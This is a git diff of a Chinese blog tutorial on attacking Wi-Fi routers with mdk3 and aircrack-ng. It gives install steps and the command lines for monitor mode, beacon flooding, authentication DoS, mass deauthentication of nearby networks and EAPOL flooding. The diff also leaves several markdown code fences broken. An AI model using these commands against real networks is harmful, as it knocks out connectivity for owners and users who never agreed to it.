@@ -3,6 +3,7 @@ layout: default
 title:  "使用mdk3+aircrack-ng攻击路由器"
 date:   2016-08-28 11:47
 categories: jekyll update
+tags: [Linux,网络]
 ---
 >mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用  
 
@@ -14,6 +15,8 @@ categories: jekyll update
 mdk3的攻击过程中是不需要网络连接的，也就是在无网络的状态下攻击，希望大家不要恶意攻击他人，保持好自己的黑客道德。  
 教程在Fedora Linux下通过测试  
 
+
+
 1. ```iwconfig```  
 使用该命令来检查是哪一个接口来支持无线连接的，如我的就是wlp2s0  
 
@@ -23,7 +26,7 @@ mdk3的攻击过程中是不需要网络连接的，也就是在无网络的状�
 3. ```dnf install aircrack-ng.x86_64```  
 现在我们来安装mdk3和aircrack-ng(aircrack-ng可能名称会发生变动，具体请使用```$ dnf search aircrack-ng```搜索软件包)  
 
-4. 
+4. 进入目录并编译:  
 ```
 cd /mdk3-master
 make
@@ -31,17 +34,17 @@ sudo make install
 ```
 下载完mdk3并解压完毕后，即可进行编译安装，在```make```时会有gcc的编译警告，忽略即可，不必担心  
 
-5.
+5. 验证安装:
 ```
 cd /usr/local/sbin
 ./mdk3
 ```
-- 如果正确安装就可以看到mdk3输出的帮助  
+<br>
 
+- 如果正确安装就可以看到mdk3输出的帮助  
 - 安装过程到此就完毕了  
 
-现在，我们来介绍如何攻击  
-```
+现在，我们来介绍如何攻击  ```
 su
 airmon-ng start {你的接口，在第一步中可以找到}
 cd /usr/local/sbin
@@ -51,9 +54,8 @@ cd /usr/local/sbin
 第一种模式：  
 beacon flood mode：  
      这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。  
-详细命令如下：  
-```
-./mdk3 mon0 b 
+详细命令如下：  ```
+./mdk3 mon0 b
 
       -n <ssid>        #自定义ESSID
       -f <filename>            #读取ESSID列表文件
@@ -70,8 +72,7 @@ beacon flood mode：
 
 第二种模式：  
 Authentication DoS：  
-这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！  
-```
+这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！  ```
 ./mdk3 mon0 a
       -a <ap_mac>              #测试指定BSS
       -m              #使用有效数据库中的客户端mac地址
@@ -82,8 +83,7 @@ Authentication DoS：
 
 第三种模式：  
 Deauthentication/Disassociation Amok：  
-强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击......可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！  
-```
+强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击......可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！  ```
 mdk3 mon0 d
       -w <filename>             #白名单mac地址列表文件
       -b <filename>              #黑名单mac地址列表文件
@@ -92,8 +92,7 @@ mdk3 mon0 d
 ```
 
 第四种模式：  
-802.1X test:
-```
+802.1X test:  ```
 mdk3 mon0 x  
       0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击
 
